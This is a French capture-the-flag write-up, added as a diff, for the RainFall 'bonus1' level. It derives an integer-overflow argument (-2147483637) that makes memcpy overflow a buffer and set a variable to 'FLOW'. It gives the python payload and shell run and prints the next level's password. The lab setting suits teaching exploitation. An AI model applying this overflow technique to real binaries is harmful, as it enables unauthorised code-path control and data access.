@@ -1,0 +1,28 @@
+Pour executer ce binaire il faut deux arguments, dont le premier un nombre inferieur a 9 et le second une chaine de cractere.
+Nous avons deux varibles. 
+	La premiere est un buffer qui commence a l'adresse 					:0xbffff694
+	La seconde est une variable de type int, elle va etre le resultat de la fonction atoi.	:0xbffff6bc
+	
+le buffer se trouve avant la variable int donc il est possible de l'ecraser avec memcpy. Il faut maintenant trouver l'offset afin d'ecraser a.
+	p 0xbffff6bc - 0xbffff694 + 0x4
+	$11 = 0x2c
+
+Maintenant nous avons notre function memcpy(new,arv[2],0x48 + 0x4 == atoi(arv[1]) * 4). Sachant que arv[1] doit etre inferieur a 0x9.
+un registre en 32 peut contenir uniquement 8 octets. Donc si on multiplie un nombre INT min/max on va perdre des bits.
+	exemple prenons intmin = -2147483648 = 0x80000000
+	il est donc inferieur a 9. si on multiplis ca value par 4 :0x200000000. Notre registre peut prendre uniquement 8 octets. Nous perdons l'octets du poids le plus fort (0x2). Sur un system a 32 bits intmin * 4 = 0x0 !!!
+	
+	Le 3e arguments du memcpy est lenght a copier. pour ecraser la seconde varaible (0xbffff6bc) il faut ecrire 44 (0x2c) caracteres. Celle ci est calculee via argv[1]:
+atoi(argv[1]) * 4 = 0x2c ; (-2147483648 + x) * 4 = 0x2c. Sachant que 4 * -2147483648 = 0 (registre 32bits). Donc x *4 = 0x2c. x = 0x2c / 4 = 11.
+	x = 11 !
+Pour ecrire 0x2c / 44 caractere arv[1] devra etre -2147483648 + 11 = -2147483637. Puis arv[2] devra comporter 44 caracteres dont les 4 derniers devront etre egal a 0x574f4c46 (little-endian)
+	python -c 'print "A"*40 + "\x46\x4c\x4f\x57"'
+	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
+
+BINGO !!!!!!
+
+
+bonus1@RainFall:~$ ./bonus1 -2147483637 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
